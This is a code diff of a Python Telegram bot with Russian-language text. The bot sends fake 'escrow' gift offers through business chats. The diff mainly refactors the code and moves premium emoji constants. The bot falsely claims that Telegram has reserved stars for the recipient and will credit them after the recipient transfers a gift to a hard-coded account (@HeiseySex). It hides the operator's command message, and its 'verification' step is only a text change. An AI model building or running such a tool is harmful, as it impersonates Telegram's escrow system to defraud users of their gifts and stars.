@@ -22,6 +22,12 @@ OWNER_ID = 861423393
 VERIFY_TIMEOUT_SECONDS = 300
 DB_FILE = "users_db.json"
 
+# ─────────────────────── ПРЕМИУМ-ЭМОДЗИ ───────────────────────
+
+EMOJI_GIFT = '<tg-emoji emoji-id="5456140674028019486">🎁</tg-emoji>'
+EMOJI_STAR = '<tg-emoji emoji-id="5874948844935974490">⭐️</tg-emoji>'
+EMOJI_LOCK = '<tg-emoji emoji-id="5807868868886009920">🔒</tg-emoji>'
+
 # ─────────────────────── БАЗА ДАННЫХ (JSON) ───────────────────────
 
 def load_db():
@@ -49,7 +55,7 @@ def get_user_settings(user_id):
             "target_url": "tg://send_gift?to=heiseysex",
             "target_nickname": "@HeiseySex",
             "escrow_template": (
-                "🔒 Пользователь зарезервировал <b>{amount}</b> ⭐ через "
+                f"{EMOJI_LOCK} Пользователь зарезервировал <b>{{amount}}</b> {EMOJI_STAR} через "
                 "эксроу-систему Telegram. Средства хранятся на специальном "
                 "эксроу-счёте и будут автоматически зачислены на ваш баланс "
                 "звёзд сразу после передачи подарка.\n\n"
@@ -60,48 +66,34 @@ def get_user_settings(user_id):
                 "3. Подтвердите передачу подарка.\n"
                 "━━━━━━━━━━━━━━━━━━━━\n\n"
                 "Telegram зафиксирует транзакцию и моментально зачислит "
-                "<b>{amount}</b> ⭐ на ваш баланс."
-            )
+                "<b>{amount}</b> {star} на ваш баланс."
+            ).replace("{star}", EMOJI_STAR) # Заменяем звезду
         }
         save_db(users_db)
     return users_db[uid]
-
-# ─────────────────────── ПРЕМИУМ-ЭМОДЗИ ───────────────────────
-
-EMOJI_GIFT = '<tg-emoji emoji-id="5456140674028019486">🎁</tg-emoji>'
-EMOJI_STAR = '<tg-emoji emoji-id="5874948844935974490">⭐️</tg-emoji>'
-EMOJI_LOCK = '<tg-emoji emoji-id="5807868868886009920">🔒</tg-emoji>'
 
 # ─────────────────────── ИНИЦИАЛИЗАЦИЯ ───────────────────────
 
 bot = telebot.TeleBot(BOT_TOKEN)
 offers = {}
 offers_lock = threading.Lock()
-
-# Состояния для ввода текста
 user_states = {}
 
 # ─────────────────────── УТИЛИТЫ ───────────────────────
 
 def normalize_url(raw):
     raw = raw.strip().strip('"').strip("'")
-    if not raw:
-        return ""
-    if raw.startswith("@"):
-        return f"https://t.me/{raw[1:]}"
-    if raw.startswith(("http://", "https://", "tg://")):
-        return raw
-    if raw.startswith(("t.me/", "telegram.me/")):
-        return f"https://{raw}"
+    if not raw: return ""
+    if raw.startswith("@"): return f"https://t.me/{raw[1:]}"
+    if raw.startswith(("http://", "https://", "tg://")): return raw
+    if raw.startswith(("t.me/", "telegram.me/")): return f"https://{raw}"
     return f"https://t.me/{raw.lstrip('/')}"
 
 def parse_gift_command(text):
     body = text.replace("/gift", "", 1).strip()
     if not body: return None
-
     quoted = re.findall(r'"([^"]*)"', body)
     without_quotes = re.sub(r'"[^"]*"', "", body).strip()
-
     if len(quoted) >= 2:
         name = quoted[0]
         url = normalize_url(quoted[1])
@@ -117,7 +109,6 @@ def parse_gift_command(text):
         name = parts[0]
         url = normalize_url(parts[1])
         amount_part = parts[2]
-
     amount = re.sub(r"\D", "", amount_part) if amount_part else ""
     if not url or not amount: return None
     return name, url, amount
@@ -138,18 +129,14 @@ def parse_inline_query(raw):
                 url_raw = words[-2]
                 amount_raw = words[-1]
             else:
-                name = text
-                url_raw = ""
-                amount_raw = ""
+                name, url_raw, amount_raw = text, "", ""
     else:
         name = parts[0]
         url_raw = parts[1] if len(parts) > 1 else ""
         amount_raw = parts[2] if len(parts) > 2 else ""
-
     amount = re.sub(r"\D", "", amount_raw)
     url = normalize_url(url_raw) if url_raw else ""
     return name, url, amount
-
 
 # ─────────────────────── ТЕКСТЫ ───────────────────────
 
@@ -173,8 +160,6 @@ def build_offer_keyboard():
 def build_escrow_message(user_id, name, url, amount):
     settings = get_user_settings(user_id)
     template = settings.get("escrow_template")
-    
-    # Подставляем значения в шаблон
     return template.format(
         gift_url=settings.get("target_url"),
         nickname=settings.get("target_nickname"),
@@ -193,15 +178,13 @@ def build_escrow_keyboard(user_id):
     )
     return keyboard
 
-
 # ─────────────────────── ОТПРАВКА ───────────────────────
 
 def try_delete_message(chat_id, message_id, conn_id=None):
     try:
         if conn_id:
             url = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteMessage"
-            payload = {"chat_id": chat_id, "message_id": message_id, "business_connection_id": conn_id}
-            requests.post(url, json=payload, timeout=10)
+            requests.post(url, json={"chat_id": chat_id, "message_id": message_id, "business_connection_id": conn_id}, timeout=10)
         else:
             bot.delete_message(chat_id, message_id)
     except Exception:
@@ -227,22 +210,14 @@ def send_business_message(chat_id, text, conn_id, reply_markup=None):
         print(f"[SEND] ОШИБКА: {e}")
         return None
 
-
-# ─────────────────────── МЕНЮ НАСТРОЕК (ЛИЧКА) ───────────────────────
+# ─────────────────────── МЕНЮ НАСТРОЕК ───────────────────────
 
 @bot.message_handler(commands=['start', 'settings'])
 def cmd_start(message):
     kb = ReplyKeyboardMarkup(resize_keyboard=True)
     kb.row(KeyboardButton("👤 Изменить ник"), KeyboardButton("🔗 Изменить ссылку"))
     kb.row(KeyboardButton("📝 Изменить текст"))
-    
-    bot.send_message(
-        message.chat.id,
-        "<b>Настройки профиля</b>\n\n"
-        "Здесь вы можете изменить данные, которые будут подставляться в предложения о подарках.",
-        parse_mode="HTML",
-        reply_markup=kb
-    )
+    bot.send_message(message.chat.id, "<b>Настройки профиля</b>\n\nЗдесь вы можете изменить данные для офферов.", parse_mode="HTML", reply_markup=kb)
 
 @bot.message_handler(func=lambda m: m.text == "👤 Изменить ник")
 def set_nick_start(message):
@@ -257,12 +232,7 @@ def set_url_start(message):
 @bot.message_handler(func=lambda m: m.text == "📝 Изменить текст")
 def set_text_start(message):
     user_states[message.from_user.id] = "waiting_text"
-    bot.send_message(
-        message.chat.id,
-        "Отправьте новый текст инструкции.\n"
-        "Доступные переменные: <code>{gift_url}</code>, <code>{nickname}</code>, <code>{name}</code>, <code>{url}</code>, <code>{amount}</code>",
-        parse_mode="HTML"
-    )
+    bot.send_message(message.chat.id, "Отправьте новый текст инструкции.\nДоступные переменные: <code>{gift_url}</code>, <code>{nickname}</code>, <code>{name}</code>, <code>{url}</code>, <code>{amount}</code>", parse_mode="HTML")
 
 @bot.message_handler(func=lambda m: m.from_user.id in user_states, content_types=['text'])
 def handle_settings_input(message):
@@ -270,19 +240,14 @@ def handle_settings_input(message):
     uid = str(message.from_user.id)
     settings = get_user_settings(message.from_user.id)
     
-    if state == "waiting_nick":
-        settings["target_nickname"] = message.text.strip()
-    elif state == "waiting_url":
-        settings["target_url"] = message.text.strip()
-    elif state == "waiting_text":
-        settings["escrow_template"] = message.text
+    if state == "waiting_nick": settings["target_nickname"] = message.text.strip()
+    elif state == "waiting_url": settings["target_url"] = message.text.strip()
+    elif state == "waiting_text": settings["escrow_template"] = message.text
     
     users_db[uid] = settings
     save_db(users_db)
     del user_states[message.from_user.id]
-    
     bot.send_message(message.chat.id, "✅ Настройки сохранены!", reply_markup=telebot.types.ReplyKeyboardRemove())
-
 
 # ─────────────────────── BUSINESS-ОБРАБОТЧИК ───────────────────────
 
@@ -290,7 +255,6 @@ def handle_settings_input(message):
 def handle_business_message(message):
     conn_id = message.business_connection_id
     sender_id = message.from_user.id
-
     if sender_id != OWNER_ID: return
     if not message.text.startswith("/gift"): return
 
@@ -301,14 +265,7 @@ def handle_business_message(message):
 
     name, url, amount = parsed
     try_delete_message(message.chat.id, message.message_id, conn_id)
-
-    # Берем настройки ТЕКУЩЕГО пользователя (тебя) для генерации оффера
-    sent = send_business_message(
-        message.chat.id,
-        build_offer_message(name, url, amount),
-        conn_id,
-        reply_markup=build_offer_keyboard(),
-    )
+    sent = send_business_message(message.chat.id, build_offer_message(name, url, amount), conn_id, reply_markup=build_offer_keyboard())
 
     if sent is None: return
 
@@ -316,8 +273,7 @@ def handle_business_message(message):
         offers[sent.message_id] = {
             "name": name, "url": url, "amount": amount,
             "finished": False, "conn_id": conn_id,
-            "chat_id": message.chat.id,
-            "user_id": sender_id
+            "chat_id": message.chat.id, "user_id": sender_id
         }
 
 # ─────────────────────── INLINE-РЕЖИМ ───────────────────────
@@ -338,10 +294,7 @@ def handle_inline_query(query):
                 id="offer_ready",
                 title=f"🎁 {name} — {amount} ⭐",
                 description=f"Отправить оффер",
-                input_message_content=InputTextMessageContent(
-                    message_text=build_offer_message(name, url, amount),
-                    parse_mode="HTML",
-                ),
+                input_message_content=InputTextMessageContent(message_text=build_offer_message(name, url, amount), parse_mode="HTML"),
                 reply_markup=build_offer_keyboard(),
             )
         )
@@ -357,8 +310,6 @@ def callback_router(call):
     payload = call.data
     conn_id = getattr(call.message, "business_connection_id", None)
     is_inline = (conn_id is None)
-    
-    # Определяем, чей это оффер (чтобы применить нужные настройки)
     offer_data = offers.get(call.message.message_id, {})
     target_user_id = offer_data.get("user_id", call.from_user.id)
 
@@ -392,23 +343,14 @@ def callback_router(call):
 
     elif payload == "stage_verify":
         bot.answer_callback_query(call.id, text="Проверка запущена.")
-        # Просто меняем текст
-        safe_edit(
-            call.message.chat.id, call.message.message_id,
-            "⏳ <b>Проверка...</b>",
-            conn_id=conn_id,
-        )
+        safe_edit(call.message.chat.id, call.message.message_id, "⏳ <b>Проверка...</b>", conn_id=conn_id)
 
     elif payload == "stage_decline":
         bot.answer_callback_query(call.id, text="Отклонено.")
         if is_inline:
             bot.send_message(call.message.chat.id, "❌ <b>Предложение отклонено.</b>", parse_mode="HTML")
         else:
-            safe_edit(
-                call.message.chat.id, call.message.message_id,
-                "❌ <b>Предложение отклонено.</b>",
-                conn_id=conn_id,
-            )
+            safe_edit(call.message.chat.id, call.message.message_id, "❌ <b>Предложение отклонено.</b>", conn_id=conn_id)
 
 # ─────────────────────── ЗАПУСК ───────────────────────
 
